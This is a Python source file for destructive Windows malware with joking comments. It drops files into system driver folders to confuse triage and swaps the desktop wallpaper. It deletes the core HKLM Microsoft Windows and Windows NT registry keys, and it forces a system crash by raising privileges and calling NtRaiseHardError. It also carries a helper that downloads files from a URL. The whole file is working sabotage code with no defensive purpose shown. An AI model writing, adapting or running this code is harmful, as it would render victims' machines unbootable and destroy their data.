import requests, subprocess, os, ctypes, winreg, wmi, include
import random as rand

userProfilePath = os.environ.get('USERPROFILE')


# to throw off triage
def ufck():
    # drop notepad in drivers folder
    try:
        with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
            npFile.write(bytes(include.notepad))
        with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
            npFile.write(bytes(include.notepad))
    except:
        print('wuh oh :-)')

    # set image as wallpaper
    with open(f'{userProfilePath}\\sigma.png', 'wb') as sigma:
        sigma.write(bytes(include.images[rand.randint(0,3)]))

    # change wallpaper
    os.system('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
    os.system(f'reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "{userProfilePath}\sigma.png" /f')
    ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{userProfilePath}\\sigma.png', 3)


# mostly unused since everything is stored locally now
def downloadFile(url, filename):
    file = requests.get(url)
    with open(filename, 'wb') as npFile:
        npFile.write(file.content)

# cut down on code
def do_command(cmd):
    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)

# do funny registry
def regFuck():
    try:
        funny = winreg.HKEY_LOCAL_MACHINE
        winreg.EnumKey(funny, 0)
        do_command('reg delete "HKLM\SOFTWARE\Microsoft\Windows NT" /f')
        do_command('reg delete "HKLM\SOFTWARE\Microsoft\Windows" /f')
    except:
        print('bruh')

# throws a bugcheck
def Bugcheck(code):
    try:
        # specify ntdll
        ntdl = ctypes.windll.ntdll

        # adjust privileges to do funny
        funny = ntdl.RtlAdjustPrivilege(19, True, False, ctypes.pointer(ctypes.c_bool()))

        #do the funny
        response = ctypes.c_ulong()
        funny = ntdl.NtRaiseHardError(code, 0, 0, 0, 6, ctypes.byref(response))
    except:
        print('you win!')